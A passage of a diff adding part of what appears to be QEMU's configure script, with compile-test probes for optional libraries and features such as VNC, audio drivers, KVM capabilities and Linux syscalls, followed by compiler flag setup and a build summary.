+  if compile_prog "$vnc_tls_cflags" "$vnc_tls_libs" ; then
+    vnc_tls=yes
+    libs_softmmu="$vnc_tls_libs $libs_softmmu"
+  else
+    if test "$vnc_tls" = "yes" ; then
+      feature_not_found "vnc-tls"
+    fi
+    vnc_tls=no
+  fi
+fi
+
+##########################################
+# VNC SASL detection
+if test "$vnc_sasl" != "no" ; then
+  cat > $TMPC <<EOF
+#include <sasl/sasl.h>
+#include <stdio.h>
+int main(void) { sasl_server_init(NULL, "qemu"); return 0; }
+EOF
+  # Assuming Cyrus-SASL installed in /usr prefix
+  vnc_sasl_cflags=""
+  vnc_sasl_libs="-lsasl2"
+  if compile_prog "$vnc_sasl_cflags" "$vnc_sasl_libs" ; then
+    vnc_sasl=yes
+    libs_softmmu="$vnc_sasl_libs $libs_softmmu"
+  else
+    if test "$vnc_sasl" = "yes" ; then
+      feature_not_found "vnc-sasl"
+    fi
+    vnc_sasl=no
+  fi
+fi
+
+##########################################
+# VNC JPEG detection
+if test "$vnc_jpeg" != "no" ; then
+cat > $TMPC <<EOF
+#include <stdio.h>
+#include <jpeglib.h>
+int main(void) { struct jpeg_compress_struct s; jpeg_create_compress(&s); return 0; }
+EOF
+    vnc_jpeg_cflags=""
+    vnc_jpeg_libs="-ljpeg"
+  if compile_prog "$vnc_jpeg_cflags" "$vnc_jpeg_libs" ; then
+    vnc_jpeg=yes
+    libs_softmmu="$vnc_jpeg_libs $libs_softmmu"
+  else
+    if test "$vnc_jpeg" = "yes" ; then
+      feature_not_found "vnc-jpeg"
+    fi
+    vnc_jpeg=no
+  fi
+fi
+
+##########################################
+# VNC PNG detection
+if test "$vnc_png" != "no" ; then
+cat > $TMPC <<EOF
+//#include <stdio.h>
+#include <png.h>
+#include <stddef.h>
+int main(void) {
+    png_structp png_ptr;
+    png_ptr = png_create_write_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
+    return 0;
+}
+EOF
+    vnc_png_cflags=""
+    vnc_png_libs="-lpng"
+  if compile_prog "$vnc_png_cflags" "$vnc_png_libs" ; then
+    vnc_png=yes
+    libs_softmmu="$vnc_png_libs $libs_softmmu"
+  else
+    if test "$vnc_png" = "yes" ; then
+      feature_not_found "vnc-png"
+    fi
+    vnc_png=no
+  fi
+fi
+
+##########################################
+# fnmatch() probe, used for ACL routines
+fnmatch="no"
+cat > $TMPC << EOF
+#include <fnmatch.h>
+int main(void)
+{
+    fnmatch("foo", "foo", 0);
+    return 0;
+}
+EOF
+if compile_prog "" "" ; then
+   fnmatch="yes"
+fi
+
+##########################################
+# uuid_generate() probe, used for vdi block driver
+if test "$uuid" != "no" ; then
+  uuid_libs="-luuid"
+  cat > $TMPC << EOF
+#include <uuid/uuid.h>
+int main(void)
+{
+    uuid_t my_uuid;
+    uuid_generate(my_uuid);
+    return 0;
+}
+EOF
+  if compile_prog "" "$uuid_libs" ; then
+    uuid="yes"
+    libs_softmmu="$uuid_libs $libs_softmmu"
+    libs_tools="$uuid_libs $libs_tools"
+  else
+    if test "$uuid" = "yes" ; then
+      feature_not_found "uuid"
+    fi
+    uuid=no
+  fi
+fi
+
+##########################################
+# xfsctl() probe, used for raw-posix
+if test "$xfs" != "no" ; then
+  cat > $TMPC << EOF
+#include <xfs/xfs.h>
+int main(void)
+{
+    xfsctl(NULL, 0, 0, NULL);
+    return 0;
+}
+EOF
+  if compile_prog "" "" ; then
+    xfs="yes"
+  else
+    if test "$xfs" = "yes" ; then
+      feature_not_found "xfs"
+    fi
+    xfs=no
+  fi
+fi
+
+##########################################
+# vde libraries probe
+if test "$vde" != "no" ; then
+  vde_libs="-lvdeplug"
+  cat > $TMPC << EOF
+#include <libvdeplug.h>
+int main(void)
+{
+    struct vde_open_args a = {0, 0, 0};
+    vde_open("", "", &a);
+    return 0;
+}
+EOF
+  if compile_prog "" "$vde_libs" ; then
+    vde=yes
+    libs_softmmu="$vde_libs $libs_softmmu"
+    libs_tools="$vde_libs $libs_tools"
+  else
+    if test "$vde" = "yes" ; then
+      feature_not_found "vde"
+    fi
+    vde=no
+  fi
+fi
+
+##########################################
+# Sound support libraries probe
+
+audio_drv_probe()
+{
+    drv=$1
+    hdr=$2
+    lib=$3
+    exp=$4
+    cfl=$5
+        cat > $TMPC << EOF
+#include <$hdr>
+int main(void) { $exp }
+EOF
+    if compile_prog "$cfl" "$lib" ; then
+        :
+    else
+        echo
+        echo "Error: $drv check failed"
+        echo "Make sure to have the $drv libs and headers installed."
+        echo
+        exit 1
+    fi
+}
+
+audio_drv_list=`echo "$audio_drv_list" | sed -e 's/,/ /g'`
+for drv in $audio_drv_list; do
+    case $drv in
+    alsa)
+    audio_drv_probe $drv alsa/asoundlib.h -lasound \
+        "snd_pcm_t **handle; return snd_pcm_close(*handle);"
+    libs_softmmu="-lasound $libs_softmmu"
+    ;;
+
+    fmod)
+    if test -z $fmod_lib || test -z $fmod_inc; then
+        echo
+        echo "Error: You must specify path to FMOD library and headers"
+        echo "Example: --fmod-inc=/path/include/fmod --fmod-lib=/path/lib/libfmod-3.74.so"
+        echo
+        exit 1
+    fi
+    audio_drv_probe $drv fmod.h $fmod_lib "return FSOUND_GetVersion();" "-I $fmod_inc"
+    libs_softmmu="$fmod_lib $libs_softmmu"
+    ;;
+
+    esd)
+    audio_drv_probe $drv esd.h -lesd 'return esd_play_stream(0, 0, "", 0);'
+    libs_softmmu="-lesd $libs_softmmu"
+    audio_pt_int="yes"
+    ;;
+
+    pa)
+    audio_drv_probe $drv pulse/simple.h "-lpulse-simple -lpulse" \
+        "pa_simple *s = NULL; pa_simple_free(s); return 0;"
+    libs_softmmu="-lpulse -lpulse-simple $libs_softmmu"
+    audio_pt_int="yes"
+    ;;
+
+    coreaudio)
+      libs_softmmu="-framework CoreAudio $libs_softmmu"
+    ;;
+
+    dsound)
+      libs_softmmu="-lole32 -ldxguid $libs_softmmu"
+      audio_win_int="yes"
+    ;;
+
+    oss)
+      libs_softmmu="$oss_lib $libs_softmmu"
+    ;;
+
+    sdl|wav)
+    # XXX: Probes for CoreAudio, DirectSound, SDL(?)
+    ;;
+
+    winwave)
+      libs_softmmu="-lwinmm $libs_softmmu"
+      audio_win_int="yes"
+    ;;
+
+    *)
+    echo "$audio_possible_drivers" | grep -q "\<$drv\>" || {
+        echo
+        echo "Error: Unknown driver '$drv' selected"
+        echo "Possible drivers are: $audio_possible_drivers"
+        echo
+        exit 1
+    }
+    ;;
+    esac
+done
+
+##########################################
+# BrlAPI probe
+
+if test "$brlapi" != "no" ; then
+  brlapi_libs="-lbrlapi"
+  cat > $TMPC << EOF
+#include <brlapi.h>
+#include <stddef.h>
+int main( void ) { return brlapi__openConnection (NULL, NULL, NULL); }
+EOF
+  if compile_prog "" "$brlapi_libs" ; then
+    brlapi=yes
+    libs_softmmu="$brlapi_libs $libs_softmmu"
+  else
+    if test "$brlapi" = "yes" ; then
+      feature_not_found "brlapi"
+    fi
+    brlapi=no
+  fi
+fi
+
+##########################################
+# curses probe
+curses_list="-lncurses -lcurses"
+
+if test "$curses" != "no" ; then
+  curses_found=no
+  cat > $TMPC << EOF
+#include <curses.h>
+#ifdef __OpenBSD__
+#define resize_term resizeterm
+#endif
+int main(void) { resize_term(0, 0); return curses_version(); }
+EOF
+  for curses_lib in $curses_list; do
+    if compile_prog "" "$curses_lib" ; then
+      curses_found=yes
+      libs_softmmu="$curses_lib $libs_softmmu"
+      break
+    fi
+  done
+  if test "$curses_found" = "yes" ; then
+    curses=yes
+  else
+    if test "$curses" = "yes" ; then
+      feature_not_found "curses"
+    fi
+    curses=no
+  fi
+fi
+
+##########################################
+# curl probe
+
+if $pkg_config libcurl --modversion >/dev/null 2>&1; then
+  curlconfig="$pkg_config libcurl"
+else
+  curlconfig=curl-config
+fi
+
+if test "$curl" != "no" ; then
+  cat > $TMPC << EOF
+#include <curl/curl.h>
+int main(void) { return curl_easy_init(); }
+EOF
+  curl_cflags=`$curlconfig --cflags 2>/dev/null`
+  curl_libs=`$curlconfig --libs 2>/dev/null`
+  if compile_prog "$curl_cflags" "$curl_libs" ; then
+    curl=yes
+    libs_tools="$curl_libs $libs_tools"
+    libs_softmmu="$curl_libs $libs_softmmu"
+  else
+    if test "$curl" = "yes" ; then
+      feature_not_found "curl"
+    fi
+    curl=no
+  fi
+fi # test "$curl"
+
+##########################################
+# check framework probe
+
+if test "$check_utests" != "no" ; then
+  cat > $TMPC << EOF
+#include <check.h>
+int main(void) { suite_create("qemu test"); return 0; }
+EOF
+  check_libs=`$pkg_config --libs check`
+  if compile_prog "" $check_libs ; then
+    check_utests=yes
+    libs_tools="$check_libs $libs_tools"
+  else
+    if test "$check_utests" = "yes" ; then
+      feature_not_found "check"
+    fi
+    check_utests=no
+  fi
+fi # test "$check_utests"
+
+##########################################
+# bluez support probe
+if test "$bluez" != "no" ; then
+  cat > $TMPC << EOF
+#include <bluetooth/bluetooth.h>
+int main(void) { return bt_error(0); }
+EOF
+  bluez_cflags=`$pkg_config --cflags bluez 2> /dev/null`
+  bluez_libs=`$pkg_config --libs bluez 2> /dev/null`
+  if compile_prog "$bluez_cflags" "$bluez_libs" ; then
+    bluez=yes
+    libs_softmmu="$bluez_libs $libs_softmmu"
+  else
+    if test "$bluez" = "yes" ; then
+      feature_not_found "bluez"
+    fi
+    bluez="no"
+  fi
+fi
+
+##########################################
+# kvm probe
+if test "$kvm" != "no" ; then
+    cat > $TMPC <<EOF
+#include <linux/kvm.h>
+#if !defined(KVM_API_VERSION) || KVM_API_VERSION < 12 || KVM_API_VERSION > 12
+#error Invalid KVM version
+#endif
+EOF
+    must_have_caps="KVM_CAP_USER_MEMORY \
+                    KVM_CAP_DESTROY_MEMORY_REGION_WORKS \
+                    KVM_CAP_COALESCED_MMIO \
+                    KVM_CAP_SYNC_MMU \
+                   "
+    if test \( "$cpu" = "i386" -o "$cpu" = "x86_64" \) ; then
+      must_have_caps="$caps \
+                      KVM_CAP_SET_TSS_ADDR \
+                      KVM_CAP_EXT_CPUID \
+                      KVM_CAP_CLOCKSOURCE \
+                      KVM_CAP_NOP_IO_DELAY \
+                      KVM_CAP_PV_MMU \
+                      KVM_CAP_MP_STATE \
+                      KVM_CAP_USER_NMI \
+                     "
+    fi
+    for c in $must_have_caps ; do
+      cat >> $TMPC <<EOF
+#if !defined($c)
+#error Missing KVM capability $c
+#endif
+EOF
+    done
+    cat >> $TMPC <<EOF
+int main(void) { return 0; }
+EOF
+  if test "$kerneldir" != "" ; then
+      kvm_cflags=-I"$kerneldir"/include
+      if test \( "$cpu" = "i386" -o "$cpu" = "x86_64" \) \
+         -a -d "$kerneldir/arch/x86/include" ; then
+            kvm_cflags="$kvm_cflags -I$kerneldir/arch/x86/include"
+	elif test "$cpu" = "ppc" -a -d "$kerneldir/arch/powerpc/include" ; then
+	    kvm_cflags="$kvm_cflags -I$kerneldir/arch/powerpc/include"
+	elif test "$cpu" = "s390x" -a -d "$kerneldir/arch/s390/include" ; then
+	    kvm_cflags="$kvm_cflags -I$kerneldir/arch/s390/include"
+        elif test -d "$kerneldir/arch/$cpu/include" ; then
+            kvm_cflags="$kvm_cflags -I$kerneldir/arch/$cpu/include"
+      fi
+  else
+    kvm_cflags=`$pkg_config --cflags kvm-kmod 2>/dev/null`
+    if test "$kvm_cflags" = ""; then
+      case "$cpu" in
+      i386 | x86_64)
+        kvm_arch="x86"
+        ;;
+      ppc)
+        kvm_arch="powerpc"
+        ;;
+      *)
+        kvm_arch="$cpu"
+        ;;
+      esac
+      kvm_cflags="-I$source_path/kvm/include"
+      kvm_cflags="$kvm_cflags -include $source_path/kvm/include/linux/config.h"
+      kvm_cflags="$kvm_cflags -I$source_path/kvm/include/$kvm_arch"
+    fi
+  fi
+  kvm_cflags="$kvm_cflags -idirafter $source_path/compat"
+  if compile_prog "$kvm_cflags" "" ; then
+    kvm=yes
+    cat > $TMPC <<EOF
+#include <linux/kvm_para.h>
+int main(void) { return 0; }
+EOF
+    if compile_prog "$kvm_cflags" "" ; then
+      kvm_para=yes
+    fi
+  else
+    if test "$kvm" = "yes" ; then
+      if has awk && has grep; then
+        kvmerr=`LANG=C $cc $QEMU_CFLAGS -o $TMPE $kvm_cflags $TMPC 2>&1 \
+	| grep "error: " \
+	| awk -F "error: " '{if (NR>1) printf(", "); printf("%s",$2);}'`
+        if test "$kvmerr" != "" ; then
+          echo -e "${kvmerr}\n\
+NOTE: To enable KVM support, update your kernel to 2.6.29+ or install \
+recent kvm-kmod from http://sourceforge.net/projects/kvm."
+        fi
+      fi
+      feature_not_found "kvm"
+    fi
+    kvm=no
+  fi
+fi
+
+##########################################
+# test for KVM_CAP_PIT
+
+if test "$kvm_cap_pit" != "no" ; then
+  if test "$kvm" = "no" -a "$kvm_cap_pit" = "yes" ; then
+      feature_not_found "kvm_cap_pit (kvm is not enabled)"
+  fi
+  cat > $TMPC <<EOF
+#include <linux/kvm.h>
+#ifndef KVM_CAP_PIT
+#error "kvm no pit capability"
+#endif
+int main(void) { return 0; }
+EOF
+  if compile_prog "$kvm_cflags" ""; then
+    kvm_cap_pit=yes
+  else
+    if test "$kvm_cap_pit" = "yes" ; then
+      feature_not_found "kvm_cap_pit"
+    fi
+    kvm_cap_pit=no
+  fi
+fi
+
+##########################################
+# test for KVM_CAP_DEVICE_ASSIGNMENT
+
+if test "$kvm_cap_device_assignment" != "no" ; then
+  if test "$kvm" = "no" -a "$kvm_cap_device_assignment" = "yes" ; then
+      feature_not_found "kvm_cap_device_assignment (kvm is not enabled)"
+  fi
+  cat > $TMPC <<EOF
+#include <linux/kvm.h>
+#ifndef KVM_CAP_DEVICE_ASSIGNMENT
+#error "kvm no device assignment capability"
+#endif
+int main(void) { return 0; }
+EOF
+  if compile_prog "$kvm_cflags" "" ; then
+    kvm_cap_device_assignment=yes
+  else
+    if test "$kvm_cap_device_assignment" = "yes" ; then
+      feature_not_found "kvm_cap_device_assigment"
+    fi
+    kvm_cap_device_assignment=no
+  fi
+fi
+
+##########################################
+# libpci header probe for kvm_cap_device_assignment
+if test $kvm_cap_device_assignment = "yes" ; then
+  cat > $TMPC << EOF
+#include <pci/header.h>
+#ifndef PCI_VENDOR_ID
+#error NO LIBPCI HEADER
+#endif
+int main(void) { return 0; }
+EOF
+  if compile_prog "" "" ; then
+    kvm_cap_device_assignment=yes
+  else
+    echo
+    echo "Error: libpci header check failed"
+    echo "Disable KVM Device Assignment capability."
+    echo
+    kvm_cap_device_assignment=no
+  fi
+fi
+
+##########################################
+# test for vhost net
+
+if test "$vhost_net" != "no"; then
+    if test "$kvm" != "no"; then
+            cat > $TMPC <<EOF
+    #include <linux/vhost.h>
+    int main(void) { return 0; }
+EOF
+            if compile_prog "$kvm_cflags" "" ; then
+                vhost_net=yes
+            else
+                if test "$vhost_net" = "yes" ; then
+                    feature_not_found "vhost-net"
+                fi
+                vhost_net=no
+            fi
+    else
+            if test "$vhost_net" = "yes" ; then
+                echo "NOTE: vhost-net feature requires KVM (--enable-kvm)."
+                feature_not_found "vhost-net"
+            fi
+            vhost_net=no
+    fi
+fi
+
+##########################################
+# pthread probe
+PTHREADLIBS_LIST="-lpthread -lpthreadGC2"
+
+pthread=no
+cat > $TMPC << EOF
+#include <pthread.h>
+int main(void) { pthread_create(0,0,0,0); return 0; }
+EOF
+if compile_prog "" "" ; then
+  pthread=yes
+else
+  for pthread_lib in $PTHREADLIBS_LIST; do
+    if compile_prog "" "$pthread_lib" ; then
+      pthread=yes
+      LIBS="$pthread_lib $LIBS"
+      break
+    fi
+  done
+fi
+
+if test "$mingw32" != yes -a "$pthread" = no; then
+  echo
+  echo "Error: pthread check failed"
+  echo "Make sure to have the pthread libs and headers installed."
+  echo
+  exit 1
+fi
+
+##########################################
+# rbd probe
+if test "$rbd" != "no" ; then
+  cat > $TMPC <<EOF
+#include <stdio.h>
+#include <rados/librados.h>
+int main(void) { rados_initialize(0, NULL); return 0; }
+EOF
+  rbd_libs="-lrados -lcrypto"
+  if compile_prog "" "$rbd_libs" ; then
+    librados_too_old=no
+    cat > $TMPC <<EOF
+#include <stdio.h>
+#include <rados/librados.h>
+#ifndef CEPH_OSD_TMAP_SET
+#error missing CEPH_OSD_TMAP_SET
+#endif
+int main(void) {
+    int (*func)(const rados_pool_t pool, uint64_t *snapid) = rados_selfmanaged_snap_create;
+    rados_initialize(0, NULL);
+    return 0;
+}
+EOF
+    if compile_prog "" "$rbd_libs" ; then
+      rbd=yes
+      libs_tools="$rbd_libs $libs_tools"
+      libs_softmmu="$rbd_libs $libs_softmmu"
+    else
+      rbd=no
+      librados_too_old=yes
+    fi
+  else
+    if test "$rbd" = "yes" ; then
+      feature_not_found "rados block device"
+    fi
+    rbd=no
+  fi
+  if test "$librados_too_old" = "yes" ; then
+    echo "-> Your librados version is too old - upgrade needed to have rbd support"
+  fi
+fi
+
+##########################################
+# linux-aio probe
+
+if test "$linux_aio" != "no" ; then
+  cat > $TMPC <<EOF
+#include <libaio.h>
+#include <sys/eventfd.h>
+#include <stddef.h>
+int main(void) { io_setup(0, NULL); io_set_eventfd(NULL, 0); eventfd(0, 0); return 0; }
+EOF
+  if compile_prog "" "-laio" ; then
+    linux_aio=yes
+    libs_softmmu="$libs_softmmu -laio"
+    libs_tools="$libs_tools -laio"
+  else
+    if test "$linux_aio" = "yes" ; then
+      feature_not_found "linux AIO"
+    fi
+    linux_aio=no
+  fi
+fi
+
+##########################################
+# attr probe
+
+if test "$attr" != "no" ; then
+  cat > $TMPC <<EOF
+#include <stdio.h>
+#include <sys/types.h>
+#include <attr/xattr.h>
+int main(void) { getxattr(NULL, NULL, NULL, 0); setxattr(NULL, NULL, NULL, 0, 0); return 0; }
+EOF
+  if compile_prog "" "-lattr" ; then
+    attr=yes
+    LIBS="-lattr $LIBS"
+  else
+    if test "$attr" = "yes" ; then
+      feature_not_found "ATTR"
+    fi
+    attr=no
+  fi
+fi
+
+##########################################
+# iovec probe
+cat > $TMPC <<EOF
+#include <sys/types.h>
+#include <sys/uio.h>
+#include <unistd.h>
+int main(void) { struct iovec iov; return 0; }
+EOF
+iovec=no
+if compile_prog "" "" ; then
+  iovec=yes
+fi
+
+##########################################
+# preadv probe
+cat > $TMPC <<EOF
+#include <sys/types.h>
+#include <sys/uio.h>
+#include <unistd.h>
+int main(void) { preadv; }
+EOF
+preadv=no
+if compile_prog "" "" ; then
+  preadv=yes
+fi
+
+##########################################
+# fdt probe
+if test "$fdt" != "no" ; then
+  fdt_libs="-lfdt"
+  cat > $TMPC << EOF
+int main(void) { return 0; }
+EOF
+  if compile_prog "" "$fdt_libs" ; then
+    fdt=yes
+    libs_softmmu="$fdt_libs $libs_softmmu"
+  else
+    if test "$fdt" = "yes" ; then
+      feature_not_found "fdt"
+    fi
+    fdt=no
+  fi
+fi
+
+#
+# Check for xxxat() functions when we are building linux-user
+# emulator.  This is done because older glibc versions don't
+# have syscall stubs for these implemented.
+#
+atfile=no
+cat > $TMPC << EOF
+#define _ATFILE_SOURCE
+#include <sys/types.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+int
+main(void)
+{
+	/* try to unlink nonexisting file */
+	return (unlinkat(AT_FDCWD, "nonexistent_file", 0));
+}
+EOF
+if compile_prog "" "" ; then
+  atfile=yes
+fi
+
+# Check for inotify functions when we are building linux-user
+# emulator.  This is done because older glibc versions don't
+# have syscall stubs for these implemented.  In that case we
+# don't provide them even if kernel supports them.
+#
+inotify=no
+cat > $TMPC << EOF
+#include <sys/inotify.h>
+
+int
+main(void)
+{
+	/* try to start inotify */
+	return inotify_init();
+}
+EOF
+if compile_prog "" "" ; then
+  inotify=yes
+fi
+
+inotify1=no
+cat > $TMPC << EOF
+#include <sys/inotify.h>
+
+int
+main(void)
+{
+    /* try to start inotify */
+    return inotify_init1(0);
+}
+EOF
+if compile_prog "" "" ; then
+  inotify1=yes
+fi
+
+# check if utimensat and futimens are supported
+utimens=no
+cat > $TMPC << EOF
+#define _ATFILE_SOURCE
+#include <stddef.h>
+#include <fcntl.h>
+
+int main(void)
+{
+    utimensat(AT_FDCWD, "foo", NULL, 0);
+    futimens(0, NULL);
+    return 0;
+}
+EOF
+if compile_prog "" "" ; then
+  utimens=yes
+fi
+
+# check if pipe2 is there
+pipe2=no
+cat > $TMPC << EOF
+#include <unistd.h>
+#include <fcntl.h>
+
+int main(void)
+{
+    int pipefd[2];
+    pipe2(pipefd, O_CLOEXEC);
+    return 0;
+}
+EOF
+if compile_prog "" "" ; then
+  pipe2=yes
+fi
+
+# check if accept4 is there
+accept4=no
+cat > $TMPC << EOF
+#include <sys/socket.h>
+#include <stddef.h>
+
+int main(void)
+{
+    accept4(0, NULL, NULL, SOCK_CLOEXEC);
+    return 0;
+}
+EOF
+if compile_prog "" "" ; then
+  accept4=yes
+fi
+
+# check if tee/splice is there. vmsplice was added same time.
+splice=no
+cat > $TMPC << EOF
+#include <unistd.h>
+#include <fcntl.h>
+#include <limits.h>
+
+int main(void)
+{
+    int len, fd;
+    len = tee(STDIN_FILENO, STDOUT_FILENO, INT_MAX, SPLICE_F_NONBLOCK);
+    splice(STDIN_FILENO, NULL, fd, NULL, len, SPLICE_F_MOVE);
+    return 0;
+}
+EOF
+if compile_prog "" "" ; then
+  splice=yes
+fi
+
+##########################################
+# signalfd probe
+signalfd="no"
+cat > $TMPC << EOF
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <signal.h>
+int main(void) { return syscall(SYS_signalfd, -1, NULL, _NSIG / 8); }
+EOF
+
+if compile_prog "" "" ; then
+  signalfd=yes
+fi
+
+# check if eventfd is supported
+eventfd=no
+cat > $TMPC << EOF
+#include <sys/eventfd.h>
+
+int main(void)
+{
+    int efd = eventfd(0, 0);
+    return 0;
+}
+EOF
+if compile_prog "" "" ; then
+  eventfd=yes
+fi
+
+# check for fallocate
+fallocate=no
+cat > $TMPC << EOF
+#include <fcntl.h>
+
+int main(void)
+{
+    fallocate(0, 0, 0, 0);
+    return 0;
+}
+EOF
+if compile_prog "$ARCH_CFLAGS" "" ; then
+  fallocate=yes
+fi
+
+# check for sync_file_range
+sync_file_range=no
+cat > $TMPC << EOF
+#include <fcntl.h>
+
+int main(void)
+{
+    sync_file_range(0, 0, 0, 0);
+    return 0;
+}
+EOF
+if compile_prog "$ARCH_CFLAGS" "" ; then
+  sync_file_range=yes
+fi
+
+# check for linux/fiemap.h and FS_IOC_FIEMAP
+fiemap=no
+cat > $TMPC << EOF
+#include <sys/ioctl.h>
+#include <linux/fs.h>
+#include <linux/fiemap.h>
+
+int main(void)
+{
+    ioctl(0, FS_IOC_FIEMAP, 0);
+    return 0;
+}
+EOF
+if compile_prog "$ARCH_CFLAGS" "" ; then
+  fiemap=yes
+fi
+
+# check for dup3
+dup3=no
+cat > $TMPC << EOF
+#include <unistd.h>
+
+int main(void)
+{
+    dup3(0, 0, 0);
+    return 0;
+}
+EOF
+if compile_prog "" "" ; then
+  dup3=yes
+fi
+
+# Check if tools are available to build documentation.
+if test "$docs" != "no" ; then
+  if has makeinfo && has pod2man; then
+    docs=yes
+  else
+    if test "$docs" = "yes" ; then
+      feature_not_found "docs"
+    fi
+    docs=no
+  fi
+fi
+
+# Search for bswap_32 function
+byteswap_h=no
+cat > $TMPC << EOF
+#include <byteswap.h>
+int main(void) { return bswap_32(0); }
+EOF
+if compile_prog "" "" ; then
+  byteswap_h=yes
+fi
+
+# Search for bswap_32 function
+bswap_h=no
+cat > $TMPC << EOF
+#include <sys/endian.h>
+#include <sys/types.h>
+#include <machine/bswap.h>
+int main(void) { return bswap32(0); }
+EOF
+if compile_prog "" "" ; then
+  bswap_h=yes
+fi
+
+##########################################
+# Do we need librt
+cat > $TMPC <<EOF
+#include <signal.h>
+#include <time.h>
+int main(void) { clockid_t id; return clock_gettime(id, NULL); }
+EOF
+
+if compile_prog "" "" ; then
+  :
+elif compile_prog "" "-lrt" ; then
+  LIBS="-lrt $LIBS"
+fi
+
+if test "$darwin" != "yes" -a "$mingw32" != "yes" -a "$solaris" != yes -a \
+        "$aix" != "yes" -a "$haiku" != "yes" ; then
+    libs_softmmu="-lutil $libs_softmmu"
+fi
+
+##########################################
+# check if the compiler defines offsetof
+
+need_offsetof=yes
+cat > $TMPC << EOF
+#include <stddef.h>
+int main(void) { struct s { int f; }; return offsetof(struct s, f); }
+EOF
+if compile_prog "" "" ; then
+    need_offsetof=no
+fi
+
+##########################################
+# check if the compiler understands attribute warn_unused_result
+#
+# This could be smarter, but gcc -Werror does not error out even when warning
+# about attribute warn_unused_result
+
+gcc_attribute_warn_unused_result=no
+cat > $TMPC << EOF
+#if defined(__GNUC__) && (__GNUC__ < 4) && defined(__GNUC_MINOR__) && (__GNUC__ < 4)
+#error gcc 3.3 or older
+#endif
+int main(void) { return 0;}
+EOF
+if compile_prog "" ""; then
+    gcc_attribute_warn_unused_result=yes
+fi
+
+# spice probe
+if test "$spice" != "no" ; then
+  cat > $TMPC << EOF
+#include <spice.h>
+int main(void) { spice_server_new(); return 0; }
+EOF
+  spice_cflags=$($pkg_config --cflags spice-protocol spice-server 2>/dev/null)
+  spice_libs=$($pkg_config --libs spice-protocol spice-server 2>/dev/null)
+  if $pkg_config --atleast-version=0.5.3 spice-server >/dev/null 2>&1 && \
+     compile_prog "$spice_cflags" "$spice_libs" ; then
+    spice="yes"
+    libs_softmmu="$libs_softmmu $spice_libs"
+    QEMU_CFLAGS="$QEMU_CFLAGS $spice_cflags"
+  else
+    if test "$spice" = "yes" ; then
+      feature_not_found "spice"
+    fi
+    spice="no"
+  fi
+fi
+
+##########################################
+
+##########################################
+# check if we have fdatasync
+
+fdatasync=no
+cat > $TMPC << EOF
+#include <unistd.h>
+int main(void) { return fdatasync(0); }
+EOF
+if compile_prog "" "" ; then
+    fdatasync=yes
+fi
+
+##########################################
+# check if we have madvise
+
+madvise=no
+cat > $TMPC << EOF
+#include <sys/types.h>
+#include <sys/mman.h>
+#include <stddef.h>
+int main(void) { return madvise(NULL, 0, MADV_DONTNEED); }
+EOF
+if compile_prog "" "" ; then
+    madvise=yes
+fi
+
+##########################################
+# check if we have posix_madvise
+
+posix_madvise=no
+cat > $TMPC << EOF
+#include <sys/mman.h>
+#include <stddef.h>
+int main(void) { return posix_madvise(NULL, 0, POSIX_MADV_DONTNEED); }
+EOF
+if compile_prog "" "" ; then
+    posix_madvise=yes
+fi
+
+##########################################
+# check if trace backend exists
+
+sh "$source_path/scripts/tracetool" "--$trace_backend" --check-backend > /dev/null 2> /dev/null
+if test "$?" -ne 0 ; then
+  echo
+  echo "Error: invalid trace backend"
+  echo "Please choose a supported trace backend."
+  echo
+  exit 1
+fi
+
+##########################################
+# For 'ust' backend, test if ust headers are present
+if test "$trace_backend" = "ust"; then
+  cat > $TMPC << EOF
+#include <ust/tracepoint.h>
+#include <ust/marker.h>
+int main(void) { return 0; }
+EOF
+  if compile_prog "" "" ; then
+    LIBS="-lust $LIBS"
+  else
+    echo
+    echo "Error: Trace backend 'ust' missing libust header files"
+    echo
+    exit 1
+  fi
+fi
+
+##########################################
+# For 'dtrace' backend, test if 'dtrace' command is present
+if test "$trace_backend" = "dtrace"; then
+  if ! has 'dtrace' ; then
+    echo
+    echo "Error: dtrace command is not found in PATH $PATH"
+    echo
+    exit 1
+  fi
+  trace_backend_stap="no"
+  if has 'stap' ; then
+    trace_backend_stap="yes"
+  fi
+fi
+
+##########################################
+# End of CC checks
+# After here, no more $cc or $ld runs
+
+if test "$debug" = "no" ; then
+  CFLAGS="-O2 $CFLAGS"
+fi
+
+# Consult white-list to determine whether to enable werror
+# by default.  Only enable by default for git builds
+z_version=`cut -f3 -d. $source_path/VERSION`
+
+if test -z "$werror" ; then
+    if test "$z_version" = "50" -a \
+        "$linux" = "yes" ; then
+        werror="yes"
+    else
+        werror="no"
+    fi
+fi
+
+# Disable zero malloc errors for official releases unless explicitly told to
+# enable/disable
+if test -z "$zero_malloc" ; then
+    if test "$z_version" = "50" ; then
+	zero_malloc="no"
+    else
+	zero_malloc="yes"
+    fi
+fi
+
+if test "$werror" = "yes" ; then
+    QEMU_CFLAGS="-Werror $QEMU_CFLAGS"
+fi
+
+if test "$solaris" = "no" ; then
+    if $ld --version 2>/dev/null | grep "GNU ld" >/dev/null 2>/dev/null ; then
+        LDFLAGS="-Wl,--warn-common $LDFLAGS"
+    fi
+fi
+
+# Use ASLR, no-SEH and DEP if available
+if test "$mingw32" = "yes" ; then
+    for flag in --dynamicbase --no-seh --nxcompat; do
+        if $ld --help 2>/dev/null | grep ".$flag" >/dev/null 2>/dev/null ; then
+            LDFLAGS="-Wl,$flag $LDFLAGS"
+        fi
+    done
+fi
+
+confdir=$sysconfdir$confsuffix
+
+tools=
+if test "$softmmu" = yes ; then
+  tools="qemu-img\$(EXESUF) qemu-io\$(EXESUF) $tools"
+  if [ "$linux" = "yes" -o "$bsd" = "yes" -o "$solaris" = "yes" ] ; then
+      tools="qemu-nbd\$(EXESUF) $tools"
+    if [ "$check_utests" = "yes" ]; then
+      tools="check-qint check-qstring check-qdict check-qlist $tools"
+      tools="check-qfloat check-qjson $tools"
+    fi
+  fi
+fi
+
+# Mac OS X ships with a broken assembler
+roms=
+if test \( "$cpu" = "i386" -o "$cpu" = "x86_64" \) -a \
+        "$targetos" != "Darwin" -a "$targetos" != "SunOS" -a \
+        "$softmmu" = yes ; then
+  roms="optionrom"
+fi
+
+
+echo "Install prefix    $prefix"
+echo "BIOS directory    `eval echo $datadir`"
+echo "binary directory  `eval echo $bindir`"
+echo "config directory  `eval echo $sysconfdir`"
+if test "$mingw32" = "no" ; then
+echo "Manual directory  `eval echo $mandir`"
+echo "ELF interp prefix $interp_prefix"
+fi
+echo "Source path       $source_path"
+echo "C compiler        $cc"
